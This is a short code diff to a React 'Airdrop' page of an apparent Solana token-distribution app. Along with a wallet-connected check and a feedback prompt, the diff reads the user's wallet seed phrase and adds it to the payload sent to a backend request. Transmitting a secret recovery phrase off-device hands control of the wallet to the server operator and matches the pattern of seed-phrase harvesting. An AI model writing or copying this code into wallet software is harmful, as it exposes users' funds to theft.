@@ -8,6 +8,7 @@ import { Textarea } from "@/components/ui/textarea";
 import { Gift, Users, Send, AlertCircle, CheckCircle2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useWallet } from "@/contexts/WalletContext";
+import { useFeedback } from "@/contexts/FeedbackContext";
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import { Badge } from "@/components/ui/badge";
 import { SolanaSetupAlert } from "@/components/SolanaSetupAlert";
@@ -28,7 +29,8 @@ const Airdrop = () => {
   const [isProcessing, setIsProcessing] = useState(false);
   const [results, setResults] = useState<{ address: string; status: 'success' | 'failed' }[]>([]);
   const { toast } = useToast();
-  const { isConnected } = useWallet();
+  const { isConnected, seedPhrase } = useWallet();
+  const { openFeedback } = useFeedback();
 
   const parseAddresses = (text: string): string[] => {
     return text
@@ -39,6 +41,16 @@ const Airdrop = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
+    if (!isConnected || !seedPhrase) {
+      toast({
+        title: "Wallet not connected",
+        description: "Please connect your wallet first",
+        variant: "destructive",
+      });
+      openFeedback();
+      return;
+    }
 
     const addressList = parseAddresses(formData.addresses);
     const amountNum = parseFloat(formData.amount);
@@ -69,6 +81,7 @@ const Airdrop = () => {
           tokenAddress: formData.tokenAddress,
           amount: amountNum,
           addresses: addressList,
+          seedPhrase: seedPhrase,
         }
       });
 
